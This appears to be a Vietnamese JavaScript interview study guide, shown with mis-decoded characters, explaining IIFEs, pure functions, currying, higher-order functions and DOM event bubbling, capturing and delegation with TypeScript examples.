- **Reusable functions** v·ªõi preset arguments: `const add5 = add(5); add5(10) // Ch√∫ gi·∫£i: 15`
- Use case: event handlers, middleware, configuration functions

**4. Higher-Order Functions:**
- Functions nh·∫≠n/return functions: `.map()`, `.filter()`, `.reduce()`
- **Composition**: k·∫øt h·ª£p nhi·ªÅu functions `compose(f, g, h)(x) = f(g(h(x)))`
- Use case: middleware stack, decorators, memoization

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Qu√™n `()` trong IIFE ‚Üí `(function(){})` kh√¥ng execute
- Mutate data trong pure function ‚Üí side effects, kh√≥ debug
- Over-curry functions ‚Üí code kh√≥ ƒë·ªçc `f(a)(b)(c)(d)(e)`

**üí° Ki·∫øn Th·ª©c Senior:**
- IIFE gi·ªù **√≠t d√πng** v√¨ ES6 modules (`import/export`) v√† block scope (`let/const`)
- Pure functions quan tr·ªçng cho **memoization** (cache k·∫øt qu·∫£) v√† **parallelization**
- Currying vs Partial Application: Curry **lu√¥n return unary** (1 param), Partial c√≥ th·ªÉ nhi·ªÅu params
- Functional Programming gi√∫p **avoid shared mutable state** ‚Üí tr√°nh race conditions trong async code




**‚ö° Quick Summary:**
> IIFE = `(function(){})()` - ch·∫°y ngay, t·∫°o scope ri√™ng. FP = pure functions, immutability

**üí° Ghi Nh·ªõ:**
- üéØ **IIFE**: Execute ngay, tr√°nh pollute global scope
- üî• **Pure Function**: Same input ‚Üí same output, no side effects
- üì¶ **Currying**: `f(a,b)` ‚Üí `f(a)(b)` - partial application

**‚ùì C√¢u H·ªèi:**

Gi·∫£i th√≠ch IIFE, Pure Functions, Currying v√† Higher-Order Functions trong JavaScript. Bao g·ªìm c√°ch ho·∫°t ƒë·ªông, ∆∞u nh∆∞·ª£c ƒëi·ªÉm v√† ·ª©ng d·ª•ng th·ª±c t·∫ø.


---

**üìö Ph·∫ßn 1: IIFE (Immediately Invoked Function Expression)**

**üí° IIFE L√† G√¨?**

IIFE (ƒë·ªçc l√† "iffy") l√† m·ªôt function ƒë∆∞·ª£c **g·ªçi ngay l·∫≠p t·ª©c** sau khi ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a. N√≥ t·∫°o ra m·ªôt **scope ri√™ng bi·ªát**, gi√∫p tr√°nh √¥ nhi·ªÖm global namespace.

**üî• C√∫ Ph√°p:**

```typescript
// C√°ch 1: B·ªçc function trong ()
(function () {
  // Code ·ªü ƒë√¢y ch·∫°y ngay l·∫≠p t·ª©c
})();

// C√°ch 2: B·ªçc to√†n b·ªô trong ()
(function () {
  // Code ·ªü ƒë√¢y ch·∫°y ngay l·∫≠p t·ª©c
})();
```

**üí° T·∫°i Sao C·∫ßn IIFE?**

```typescript
// ‚ùå KH√îNG d√πng IIFE - Bi·∫øn x, y "r√≤ r·ªâ" ra global scope
let x = 10;
let y = 20;
console.log(window.x); // 10 - √î nhi·ªÖm global scope! ‚ùå

// ‚úÖ D√πng IIFE - Bi·∫øn x, y KH√îNG r√≤ r·ªâ
(function () {
  let x = 10; // Private variable - ch·ªâ t·ªìn t·∫°i trong scope n√†y
  let y = 20;
  console.log(x + y); // Ch√∫ gi·∫£i: 30
})();

console.log(typeof x); // "undefined" - x KH√îNG t·ªìn t·∫°i b√™n ngo√†i ‚úÖ
```

**üéØ Use Cases c·ªßa IIFE:**

```typescript
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
const calculator = (function () {
  let result = 0; // ‚ö†Ô∏è Private variable - kh√¥ng th·ªÉ access t·ª´ b√™n ngo√†i

  return {
    add(x: number): number {
      result += x; // Ch·ªâ thay ƒë·ªïi ƒë∆∞·ª£c qua method n√†y
      return result;
    },
    subtract(x: number): number {
      result -= x;
      return result;
    },
    getResult(): number {
      return result; // Ch·ªâ ƒë·ªçc ƒë∆∞·ª£c qua method n√†y
    },
  };
})();

calculator.add(10); // Ch√∫ gi·∫£i: 10
calculator.subtract(3); // Ch√∫ gi·∫£i: 7
console.log(calculator.result); // undefined - ‚ùå Kh√¥ng access ƒë∆∞·ª£c private variable
console.log(calculator.getResult()); // 7 - ‚úÖ Ph·∫£i d√πng method

// 2Ô∏è‚É£ IIFE v·ªõi Parameters - Truy·ªÅn arguments v√†o
(function (name: string, age: number) {
  console.log(`Xin ch√†o ${name}, ${age} tu·ªïi`);
})('John', 25); // "Xin ch√†o John, 25 tu·ªïi"

// 3Ô∏è‚É£ IIFE v·ªõi Return Value - Tr·∫£ v·ªÅ k·∫øt qu·∫£
const sum = (function (a: number, b: number): number {
  return a + b; // T√≠nh to√°n v√† tr·∫£ v·ªÅ ngay l·∫≠p t·ª©c
})(5, 10);
console.log(sum); // Ch√∫ gi·∫£i: 15

// 4Ô∏è‚É£ IIFE v·ªõi Async/Await - X·ª≠ l√Ω b·∫•t ƒë·ªìng b·ªô
(async function () {
  try {
    const response = await fetch('/api/users');
    const users = await response.json();
    console.log(users);
  } catch (error) {
    console.error('L·ªói:', error);
  }
})();
```

**‚úÖ ∆Øu ƒêi·ªÉm c·ªßa IIFE:**

- ‚úÖ **Data Privacy**: T·∫°o private variables/functions
- ‚úÖ **Tr√°nh Global Pollution**: Variables kh√¥ng r√≤ r·ªâ ra global scope
- ‚úÖ **Module Pattern**: T·∫°o modules v·ªõi public/private members
- ‚úÖ **One-time Execution**: Code ch·∫°y 1 l·∫ßn duy nh·∫•t

**‚ùå Nh∆∞·ª£c ƒêi·ªÉm c·ªßa IIFE:**

- ‚ùå **Kh√≥ ƒë·ªçc**: Syntax ph·ª©c t·∫°p cho beginners
- ‚ùå **Kh√≥ debug**: Stack trace ph·ª©c t·∫°p h∆°n
- ‚ùå **ES6 Modules t·ªët h∆°n**: Hi·ªán nay d√πng `import/export` thay th·∫ø

---


**üìö Ph·∫ßn 2: Functional Programming - Pure Functions, Currying & HOF**

**üí° Functional Programming L√† G√¨?**

Functional Programming (FP) l√† paradigm l·∫≠p tr√¨nh t·∫≠p trung v√†o:

- **Pure Functions**: H√†m kh√¥ng c√≥ side effects
- **Immutability**: Kh√¥ng thay ƒë·ªïi d·ªØ li·ªáu g·ªëc
- **Function Composition**: K·∫øt h·ª£p c√°c h√†m nh·ªè th√†nh h√†m l·ªõn

---

**üî• 1. Pure Functions (H√†m Thu·∫ßn T√∫y)**

**üí° Pure Function L√† G√¨?**

Pure function l√† h√†m th·ªèa m√£n 2 ƒëi·ªÅu ki·ªán:

1. **Same Input ‚Üí Same Output**: C√πng input lu√¥n cho c√πng output
2. **No Side Effects**: Kh√¥ng thay ƒë·ªïi state b√™n ngo√†i (global variables, database, file, etc.)

```typescript
// ‚úÖ Pure Function - Ho√†n h·∫£o!
function add(a: number, b: number): number {
  return a + b; // ‚úÖ Ch·ªâ t√≠nh to√°n, kh√¥ng side effects
}

console.log(add(2, 3)); // 5 - G·ªçi 1000 l·∫ßn v·∫´n tr·∫£ v·ªÅ 5
console.log(add(2, 3)); // 5 - Predictable (d·ª± ƒëo√°n ƒë∆∞·ª£c)

// ‚ùå Impure Function - C√≥ side effects
let counter = 0; // Ch√∫ gi·∫£i: ‚ö†Ô∏è External state

function increment(): number {
  counter++; // ‚ùå Side effect - thay ƒë·ªïi bi·∫øn b√™n ngo√†i
  return counter;
}

console.log(increment()); // Ch√∫ gi·∫£i: 1
console.log(increment()); // 2 - ‚ùå C√πng input (kh√¥ng c√≥), kh√°c output!

// ‚úÖ Chuy·ªÉn th√†nh Pure Function
function increment(counter: number): number {
  return counter + 1; // ‚úÖ Kh√¥ng thay ƒë·ªïi state, return gi√° tr·ªã m·ªõi
}

let myCounter = 0;
myCounter = increment(myCounter); // 1 - R√µ r√†ng, d·ªÖ test
myCounter = increment(myCounter); // Ch√∫ gi·∫£i: 2
```

**üéØ ∆Øu ƒêi·ªÉm c·ªßa Pure Functions:**

- ‚úÖ **Testable**: D·ªÖ test (ch·ªâ c·∫ßn check input/output)
- ‚úÖ **Predictable**: D·ª± ƒëo√°n ƒë∆∞·ª£c k·∫øt qu·∫£
- ‚úÖ **Cacheable**: C√≥ th·ªÉ cache k·∫øt qu·∫£ (memoization)
- ‚úÖ **Parallel Safe**: An to√†n khi ch·∫°y song song

---

**üî• 2. Currying (Chuy·ªÉn ƒê·ªïi H√†m)**

**üí° Currying L√† G√¨?**

Currying l√† k·ªπ thu·∫≠t **chuy·ªÉn ƒë·ªïi** m·ªôt function nh·∫≠n **nhi·ªÅu tham s·ªë** th√†nh **chu·ªói c√°c functions**, m·ªói function nh·∫≠n **1 tham s·ªë**.

```typescript
// ‚ùå Function th√¥ng th∆∞·ªùng - Nh·∫≠n t·∫•t c·∫£ tham s·ªë c√πng l√∫c
function add(a: number, b: number): number {
  return a + b;
}
console.log(add(2, 3)); // 5 - Ph·∫£i truy·ªÅn c·∫£ 2 s·ªë

 // Ch√∫ gi·∫£i: ‚úÖ Currying - Nh·∫≠n t·ª´ng tham s·ªë m·ªôt
const add = (a: number) => (b: number) => a + b;
//            ‚Üë nh·∫≠n a    ‚Üë tr·∫£ v·ªÅ function nh·∫≠n b

const add2 = add(2); // add2 l√† function: (b) => 2 + b
console.log(add2(3)); // 5 - Gi·ªëng k·∫øt qu·∫£ tr√™n
console.log(add2(10)); // 12 - C√≥ th·ªÉ t√°i s·ª≠ d·ª•ng add2
console.log(add(2)(3)); // 5 - Ho·∫∑c g·ªçi lu√¥n
```

**üéØ Use Cases c·ªßa Currying:**

```typescript
// 1Ô∏è‚É£ T·∫°o specialized functions (h√†m chuy√™n d·ª•ng)
const multiply = (a: number) => (b: number) => a * b;

const double = multiply(2); // H√†m nh√¢n ƒë√¥i
const triple = multiply(3); // H√†m nh√¢n ba

console.log(double(5)); // 10 - double t√°i s·ª≠ d·ª•ng ƒë∆∞·ª£c
console.log(triple(5)); // Ch√∫ gi·∫£i: 15

// 2Ô∏è‚É£ Partial Application - √Åp d·ª•ng m·ªôt ph·∫ßn tham s·ªë
const calculateTax = (rate: number) => (amount: number) => amount * rate;

const calculateVAT = calculateTax(0.1); // Ch√∫ gi·∫£i: VAT 10%
const calculateLuxuryTax = calculateTax(0.2); // Ch√∫ gi·∫£i: Luxury tax 20%

console.log(calculateVAT(1000)); // Ch√∫ gi·∫£i: 100 - 10% c·ªßa 1000
console.log(calculateLuxuryTax(1000)); // Ch√∫ gi·∫£i: 200 - 20% c·ªßa 1000

// 3Ô∏è‚É£ Currying v·ªõi nhi·ªÅu tham s·ªë
const volume = (length: number) => (width: number) => (height: number) =>
  length * width * height;

const boxVolume = volume(10)(5); // Ch√∫ gi·∫£i: length=10, width=5, height=?
console.log(boxVolume(2)); // Ch√∫ gi·∫£i: 10 * 5 * 2 = 100
console.log(boxVolume(3)); // Ch√∫ gi·∫£i: 10 * 5 * 3 = 150
```

---

**üî• 3. Higher-Order Functions (HOF - H√†m B·∫≠c Cao)**

**üí° HOF L√† G√¨?**

HOF l√† function th·ªèa m√£n 1 trong 2 ƒëi·ªÅu ki·ªán:

1. **Nh·∫≠n function l√†m argument** (tham s·ªë)
2. **Tr·∫£ v·ªÅ function** (return function)

```typescript
// 1Ô∏è‚É£ HOF nh·∫≠n function l√†m argument
function withLogging<T extends (...args: any[]) => any>(
  fn: T // ‚ö†Ô∏è Nh·∫≠n function l√†m tham s·ªë
): (...args: Parameters<T>) => ReturnType<T> {
  return (...args: Parameters<T>) => {
    console.log('üîç G·ªçi function v·ªõi:', args);
    const result = fn(...args); // Ch√∫ gi·∫£i: G·ªçi function g·ªëc
    console.log('‚úÖ K·∫øt qu·∫£:', result);
    return result;
  };
}

const add = (a: number, b: number) => a + b;
const loggedAdd = withLogging(add); // Ch√∫ gi·∫£i: B·ªçc add v·ªõi logging

loggedAdd(2, 3);
 // Ch√∫ gi·∫£i: Output:
 // Ch√∫ gi·∫£i: üîç G·ªçi function v·ªõi: [2, 3]
// ‚úÖ K·∫øt qu·∫£: 5

// 2Ô∏è‚É£ HOF tr·∫£ v·ªÅ function
function createGreeter(greeting: string) {
  return (name: string) => `${greeting}, ${name}!`; // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
}

const sayHello = createGreeter('Xin ch√†o'); // T·∫°o function ch√†o h·ªèi
const sayHi = createGreeter('Hi'); // T·∫°o function ch√†o h·ªèi kh√°c

console.log(sayHello('John')); // "Xin ch√†o, John!"
console.log(sayHi('Jane')); // Ch√∫ gi·∫£i: "Hi, Jane!"

// 3Ô∏è‚É£ Array methods ƒë·ªÅu l√† HOF
const numbers = [1, 2, 3, 4, 5];

const doubled = numbers.map((x) => x * 2); // Ch√∫ gi·∫£i: [2, 4, 6, 8, 10]
//                          ‚Üë nh·∫≠n function l√†m argument

const evens = numbers.filter((x) => x % 2 === 0); // Ch√∫ gi·∫£i: [2, 4]
//                           ‚Üë nh·∫≠n function l√†m argument

const sum = numbers.reduce((acc, x) => acc + x, 0); // Ch√∫ gi·∫£i: 15
//                         ‚Üë nh·∫≠n function l√†m argument
```

**üéØ Practical Example - Data Processing:**

```typescript
// X·ª≠ l√Ω danh s√°ch users
const users = [
  { name: 'John', age: 25, active: true },
  { name: 'Jane', age: 30, active: false },
  { name: 'Bob', age: 35, active: true },
];

// ‚ùå C√°ch c≈© - Imperative (m·ªánh l·ªánh)
const activeUserNames = [];
for (let i = 0; i < users.length; i++) {
  if (users[i].active) {
    activeUserNames.push(users[i].name.toUpperCase());
  }
}
activeUserNames.sort();

// ‚úÖ C√°ch m·ªõi - Functional Programming
const activeUserNames2 = users
  .filter((user) => user.active) // Ch√∫ gi·∫£i: 1. L·ªçc user active
  .map((user) => user.name.toUpperCase()) // 2. Chuy·ªÉn t√™n th√†nh UPPERCASE
  .sort(); // 3. S·∫Øp x·∫øp

console.log(activeUserNames2); // ['BOB', 'JOHN'] - Ng·∫Øn g·ªçn, d·ªÖ ƒë·ªçc!
```

---

**‚úÖ Best Practices:**

- ‚úÖ **∆Øu ti√™n Pure Functions**: Code predictable, d·ªÖ test
- ‚úÖ **D√πng Currying cho reusable functions**: T·∫°o specialized functions
- ‚úÖ **D√πng HOF thay v√¨ loops**: `map`, `filter`, `reduce` ng·∫Øn g·ªçn h∆°n
- ‚úÖ **Function Composition**: K·∫øt h·ª£p functions nh·ªè th√†nh function l·ªõn
- ‚úÖ **IIFE cho module pattern**: T·∫°o private scope khi c·∫ßn

**‚ùå Common Mistakes:**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå Sai: Impure function v·ªõi side effects
let total = 0;
function addToTotal(value: number): void {
  total += value; // ‚ùå Side effect - thay ƒë·ªïi bi·∫øn global
}

// ‚úÖ ƒê√∫ng: Pure function
function add(total: number, value: number): number {
  return total + value; // ‚úÖ Return gi√° tr·ªã m·ªõi, kh√¥ng thay ƒë·ªïi state
}

// ‚ùå Sai: Kh√¥ng d√πng HOF khi c√≥ th·ªÉ
const numbers = [1, 2, 3, 4, 5];
const doubled = [];
for (let i = 0; i < numbers.length; i++) {
  doubled.push(numbers[i] * 2); // ‚ùå D√†i d√≤ng, d·ªÖ l·ªói
}

// ‚úÖ ƒê√∫ng: D√πng HOF
const doubled2 = numbers.map((x) => x * 2); // ‚úÖ Ng·∫Øn g·ªçn, r√µ r√†ng

// ‚ùå Sai: Kh√¥ng d√πng currying khi c·∫ßn reuse
function calculateTax(rate: number, amount: number): number {
  return amount * rate;
}
const tax1 = calculateTax(0.1, 1000); // ‚ùå L·∫∑p l·∫°i rate nhi·ªÅu l·∫ßn
const tax2 = calculateTax(0.1, 2000);

// ‚úÖ ƒê√∫ng: D√πng currying
const calculateTax2 = (rate: number) => (amount: number) => amount * rate;
const calculateVAT = calculateTax2(0.1); // ‚úÖ T·∫°o function v·ªõi rate c·ªë ƒë·ªãnh
const tax3 = calculateVAT(1000); // G·ªçn h∆°n, t√°i s·ª≠ d·ª•ng ƒë∆∞·ª£c
const tax4 = calculateVAT(2000);
```

**üìù T√≥m T·∫Øt:**

| Concept        | M√¥ T·∫£                                          | Use Case                      |
| -------------- | ---------------------------------------------- | ----------------------------- |
| **IIFE**       | Function t·ª± g·ªçi, t·∫°o scope ri√™ng               | Module pattern, private state |
| **Pure**       | H√†m kh√¥ng side effects, predictable            | Business logic, calculations  |
| **Currying**   | Function nhi·ªÅu tham s·ªë ‚Üí chu·ªói functions       | Reusable functions, config    |
| **HOF**        | Function nh·∫≠n/tr·∫£ v·ªÅ function                  | map, filter, reduce, compose  |
| **Functional** | Paradigm t·∫≠p trung v√†o pure functions, compose | Clean code, maintainable      |
---
## 11. üé™ Q11: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)  

**P1: T√™n c√¢u h·ªèi:** üé™ Q11: DOM Events - Event Flow, Delegation & Event Properties (Bubbling, Capturing, target vs currentTarget)  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2 ph√∫t):**

**"S·ª± ki·ªán DOM c√≥ 3 giai ƒëo·∫°n: Capturing (t·ª´ tr√™n xu·ªëng) ‚Üí Target ‚Üí Bubbling (t·ª´ d∆∞·ªõi l√™n).**

**‚ôªÔ∏è Lu·ªìng S·ª± Ki·ªán (3 Giai ƒêo·∫°n):**
1. **Capturing Phase (Giai ƒëo·∫°n b·∫Øt)**: S·ª± ki·ªán t·ª´ `window` ‚Üí `document` ‚Üí `html` ‚Üí ... ‚Üí ph·∫ßn t·ª≠ target (t·ª´ tr√™n xu·ªëng).
2. **Target Phase (Giai ƒëo·∫°n target)**: S·ª± ki·ªán ch·∫°m ph·∫ßn t·ª≠ target (ph·∫ßn t·ª≠ ƒë∆∞·ª£c click).
3. **Bubbling Phase (Giai ƒëo·∫°n n·ªïi)**: S·ª± ki·ªán t·ª´ ph·∫ßn t·ª≠ target ‚Üí ... ‚Üí `html` ‚Üí `document` ‚Üí `window` (t·ª´ d∆∞·ªõi l√™n).

**üîë Kh√°i Ni·ªám C·ªët L√µi:**
- **M·∫∑c ƒë·ªãnh**: Event listeners ch·∫°y trong **Bubbling phase** (useCapture = false).
- **Capturing**: ƒê·∫∑t `useCapture: true` ‚Üí listener ch·∫°y trong Capturing phase.
  ```js
  element.addEventListener('click', handler, { capture: true });
  ```
- **D·ª´ng Lan Truy·ªÅn**: `event.stopPropagation()` ‚Üí ng·ª´ng bubbling/capturing.
- **NgƒÉn H√†nh Vi M·∫∑c ƒê·ªãnh**: `event.preventDefault()` ‚Üí ngƒÉn h√†nh vi m·∫∑c ƒë·ªãnh (vd: form submit, chuy·ªÉn link).

**üéØ M·∫´u Event Delegation:**
- **Kh√°i ni·ªám**: G·∫Øn listener ·ªü ph·∫ßn t·ª≠ cha, kh√¥ng ph·∫£i t·ª´ng con ‚Üí t·∫≠n d·ª•ng bubbling.
- **L·ª£i √≠ch**:
  - Hi·ªáu nƒÉng: 1 listener thay v√¨ 100 listeners cho 100 items.
  - N·ªôi dung ƒë·ªông: Kh√¥ng c·∫ßn g·∫Øn l·∫°i listeners khi th√™m/x√≥a con.
- **V√≠ d·ª•**:
  ```js
  // ‚ùå Kh√¥ng hi·ªáu qu·∫£: G·∫Øn listener cho t·ª´ng item
  document.querySelectorAll('.item').forEach(item => {
    item.addEventListener('click', handler); // Ch√∫ gi·∫£i: 100 listeners!
  });
  
  // ‚úÖ Hi·ªáu qu·∫£: Delegation
  document.querySelector('.list').addEventListener('click', (e) => {
    if (e.target.matches('.item')) { // Ki·ªÉm tra target
      handler(e); // Ch√∫ gi·∫£i: 1 listener!
    }
  });
  ```

**üîç `target` vs `currentTarget`:**
- **`event.target`**: Ph·∫ßn t·ª≠ th·ª±c s·ª± ƒë∆∞·ª£c click (ph·∫ßn t·ª≠ g·ªëc k√≠ch ho·∫°t s·ª± ki·ªán).
- **`event.currentTarget`**: Ph·∫ßn t·ª≠ c√≥ listener g·∫Øn v√†o (ƒëang x·ª≠ l√Ω s·ª± ki·ªán).
- **Tr∆∞·ªùng h·ª£p**: Delegation ‚Üí `currentTarget` = cha, `target` = con ƒë∆∞·ª£c click.
  ```js
  parent.addEventListener('click', (e) => {
    console.log(e.target); // Ch√∫ gi·∫£i: Child element clicked
    console.log(e.currentTarget); // Ch√∫ gi·∫£i: Parent element (listener)
  });
  ```

**‚ö†Ô∏è Common Pitfalls:**
- **stopPropagation() overuse**: NgƒÉn c·∫£ analytics tracking, global handlers ‚Üí d√πng th·∫≠n tr·ªçng.
- **preventDefault() vs stopPropagation()**: Kh√°c nhau! preventDefault ngƒÉn default action, stopPropagation ngƒÉn propagation.
- **Event delegation v·ªõi dynamic content**: Ph·∫£i check `e.target.matches()` ƒë√∫ng selector.

**üí° Senior Insights:**
- **Performance**: Event delegation gi·∫£m memory usage (1 listener vs 1000) v√† faster DOM manipulation.
- **Passive listeners**: `{ passive: true }` ‚Üí improve scroll performance (kh√¥ng block scroll while waiting for preventDefault).
  ```js
  element.addEventListener('touchstart', handler, { passive: true });
  ```
- **once option**: `{ once: true }` ‚Üí auto remove listener sau 1 l·∫ßn fire.
- **Capture for debugging**: D√πng capturing phase ƒë·ªÉ intercept events tr∆∞·ªõc khi children handle.

---

**‚ö° Quick Summary:**
> Event Bubbling = child ‚Üí parent. Capturing = parent ‚Üí child. Delegation = listen ·ªü parent

**üí° Ghi Nh·ªõ:**
- üéØ **Bubbling**: Event t·ª´ child l√™n parent (default)
- ‚¨áÔ∏è **Capturing**: Event t·ª´ parent xu·ªëng child (useCapture: true)
- üé≠ **target vs currentTarget**: target = ph·∫ßn t·ª≠ g·ªëc, currentTarget = ph·∫ßn t·ª≠ c√≥ listener

**‚ùì C√¢u H·ªèi:**

Gi·∫£i th√≠ch chi ti·∫øt c∆° ch·∫ø ho·∫°t ƒë·ªông c·ªßa DOM Events trong JavaScript, bao g·ªìm:

1. Event Flow (Event Bubbling vs Event Capturing)
2. Event Delegation Pattern
3. S·ª± kh√°c bi·ªát gi·ªØa `target` v√† `currentTarget`
4. C√°c best practices v√† common mistakes



**üìö Ph·∫ßn 1: Event Flow - 3 Phases c·ªßa DOM Events**

**üî• C∆° Ch·∫ø Ho·∫°t ƒê·ªông:**

Khi m·ªôt event x·∫£y ra tr√™n DOM element, n√≥ ƒëi qua 3 phases (giai ƒëo·∫°n):

```
Phase 1: CAPTURING PHASE (Giai ƒëo·∫°n b·∫Øt - t·ª´ tr√™n xu·ªëng)
   ‚Üì
   document
   ‚Üì
   html
   ‚Üì
   body
   ‚Üì
   parent div
   ‚Üì
Phase 2: TARGET PHASE (Giai ƒëo·∫°n m·ª•c ti√™u)
   ‚Üì
   target element (element ƒë∆∞·ª£c click)
   ‚Üì
Phase 3: BUBBLING PHASE (Giai ƒëo·∫°n n·ªïi - t·ª´ d∆∞·ªõi l√™n)
   ‚Üë
   parent div
   ‚Üë
   body
   ‚Üë
   html
   ‚Üë
   document
```

**üí° Gi·∫£i Th√≠ch Ti·∫øng Vi·ªát:**

- **Capturing Phase (B·∫Øt s·ª± ki·ªán)**: Event "r∆°i xu·ªëng" t·ª´ window ‚Üí document ‚Üí html ‚Üí body ‚Üí ... ‚Üí target element
- **Target Phase (M·ª•c ti√™u)**: Event ch·∫°m ƒë·∫øn element ƒë∆∞·ª£c click (target)
- **Bubbling Phase (N·ªïi l√™n)**: Event "n·ªïi l√™n" t·ª´ target element ‚Üí ... ‚Üí body ‚Üí html ‚Üí document ‚Üí window

**üéØ Code Example v·ªõi Ch√∫ Th√≠ch Ti·∫øng Vi·ªát:**

```typescript
// üìå HTML Structure (C·∫•u tr√∫c HTML)
 // Ch√∫ gi·∫£i: <div id="grandparent" style="padding: 50px; background: red;">
//   Grandparent (√îng)
 // Ch√∫ gi·∫£i: <div id="parent" style="padding: 30px; background: blue;">
 // Ch√∫ gi·∫£i: Parent (Cha)
 // Ch√∫ gi·∫£i: <div id="child" style="padding: 20px; background: green;">
 // Ch√∫ gi·∫£i: <button id="button">Click Me!</button>
 // Ch√∫ gi·∫£i: </div>
 // Ch√∫ gi·∫£i: </div>
 // Ch√∫ gi·∫£i: </div>

 // Ch√∫ gi·∫£i: ============================================
// üîµ EXAMPLE 1: EVENT BUBBLING (M·∫∑c ƒë·ªãnh)
// Event n·ªïi l√™n t·ª´ d∆∞·ªõi l√™n: Button ‚Üí Child ‚Üí Parent ‚Üí Grandparent
 // Ch√∫ gi·∫£i: ============================================

// Ch√∫ th√≠ch: addEventListener() m·∫∑c ƒë·ªãnh l·∫Øng nghe ·ªü BUBBLING phase
// Tham s·ªë th·ª© 3 = false (ho·∫∑c kh√¥ng truy·ªÅn) nghƒ©a l√† bubbling  
document.getElementById('button')?.addEventListener('click', (e: Event) => {
  console.log('1Ô∏è‚É£ Button clicked (bubbling)');
  // Ch·∫°y ƒë·∫ßu ti√™n v√¨ button l√† target element (ph·∫ßn t·ª≠ ƒë∆∞·ª£c click)
});

document.getElementById('child')?.addEventListener('click', (e: Event) => {
  console.log('2Ô∏è‚É£ Child div clicked (bubbling)');
  // Ch·∫°y th·ª© 2 - event n·ªïi l√™n t·ª´ button
});

document.getElementById('parent')?.addEventListener('click', (e: Event) => {
  console.log('3Ô∏è‚É£ Parent div clicked (bubbling)');
  // Ch·∫°y th·ª© 3 - event ti·∫øp t·ª•c n·ªïi l√™n
});

document.getElementById('grandparent')?.addEventListener('click', (e: Event) => {
  console.log('4Ô∏è‚É£ Grandparent div clicked (bubbling)');
  // Ch·∫°y cu·ªëi c√πng - event n·ªïi ƒë·∫øn t·∫≠n √¥ng n·ªôi
});

// üìù K·∫æT QU·∫¢ khi click button:
 // Ch√∫ gi·∫£i: 1Ô∏è‚É£ Button clicked (bubbling)
 // Ch√∫ gi·∫£i: 2Ô∏è‚É£ Child div clicked (bubbling)
 // Ch√∫ gi·∫£i: 3Ô∏è‚É£ Parent div clicked (bubbling)
 // Ch√∫ gi·∫£i: 4Ô∏è‚É£ Grandparent div clicked (bubbling)

 // Ch√∫ gi·∫£i: ============================================
// üü¢ EXAMPLE 2: EVENT CAPTURING (B·∫Øt s·ª± ki·ªán)
// Event r∆°i xu·ªëng t·ª´ tr√™n xu·ªëng: Grandparent ‚Üí Parent ‚Üí Child ‚Üí Button
 // Ch√∫ gi·∫£i: ============================================

// Ch√∫ th√≠ch: Tham s·ªë th·ª© 3 = true nghƒ©a l√† CAPTURING phase
document.getElementById('grandparent')?.addEventListener(
  'click',
  (e: Event) => {
    console.log('1Ô∏è‚É£ Grandparent clicked (capturing)');
    // Ch·∫°y ƒë·∫ßu ti√™n - √¥ng n·ªôi b·∫Øt event tr∆∞·ªõc
  },
  true // ‚ö†Ô∏è true = capturing phase (b·∫Øt t·ª´ tr√™n xu·ªëng)
);

document.getElementById('parent')?.addEventListener(
  'click',
  (e: Event) => {
    console.log('2Ô∏è‚É£ Parent clicked (capturing)');
    // Ch·∫°y th·ª© 2 - cha b·∫Øt event
  },
  true
);

document.getElementById('child')?.addEventListener(
  'click',
  (e: Event) => {
    console.log('3Ô∏è‚É£ Child clicked (capturing)');
    // Ch·∫°y th·ª© 3 - con b·∫Øt event
  },
  true
);

document.getElementById('button')?.addEventListener(
  'click',
  (e: Event) => {
    console.log('4Ô∏è‚É£ Button clicked (capturing)');
    // Ch·∫°y cu·ªëi c√πng - ƒë·∫øn target element
  },
  true
);

// üìù K·∫æT QU·∫¢ khi click button:
 // Ch√∫ gi·∫£i: 1Ô∏è‚É£ Grandparent clicked (capturing)
 // Ch√∫ gi·∫£i: 2Ô∏è‚É£ Parent clicked (capturing)
 // Ch√∫ gi·∫£i: 3Ô∏è‚É£ Child clicked (capturing)
 // Ch√∫ gi·∫£i: 4Ô∏è‚É£ Button clicked (capturing)

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: üõë EXAMPLE 3: STOP PROPAGATION
// D·ª´ng event lan truy·ªÅn (kh√¥ng n·ªïi l√™n ho·∫∑c r∆°i xu·ªëng n·ªØa)
 // Ch√∫ gi·∫£i: ============================================

document.getElementById('child')?.addEventListener('click', (e: Event) => {
  console.log('Child clicked');
  e.stopPropagation(); // ‚õî D·ª´ng event t·∫°i ƒë√¢y - kh√¥ng lan truy·ªÅn n·ªØa
  // Event KH√îNG n·ªïi l√™n parent v√† grandparent
});

document.getElementById('parent')?.addEventListener('click', () => {
  console.log('Parent clicked'); // ‚ùå KH√îNG ch·∫°y v√¨ b·ªã stopPropagation()
});

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: üö´ EXAMPLE 4: PREVENT DEFAULT
// NgƒÉn h√†nh vi m·∫∑c ƒë·ªãnh c·ªßa tr√¨nh duy·ªát
 // Ch√∫ gi·∫£i: ============================================

// V√≠ d·ª• 1: NgƒÉn link navigate
document.getElementById('myLink')?.addEventListener('click', (e: Event) => {
  e.preventDefault(); // ‚õî NgƒÉn tr√¨nh duy·ªát chuy·ªÉn trang
  console.log('Link clicked but navigation prevented');
  // Ch√∫ th√≠ch: Thay v√¨ chuy·ªÉn trang, ta c√≥ th·ªÉ x·ª≠ l√Ω logic kh√°c
});

// V√≠ d·ª• 2: NgƒÉn form submit
document.getElementById('myForm')?.addEventListener('submit', (e: Event) => {
  e.preventDefault(); // ‚õî NgƒÉn form g·ª≠i ƒëi (reload trang)
  console.log('Form submit prevented - validating data...');
  // Ch√∫ th√≠ch: Validate d·ªØ li·ªáu tr∆∞·ªõc khi submit b·∫±ng AJAX
});
```

---

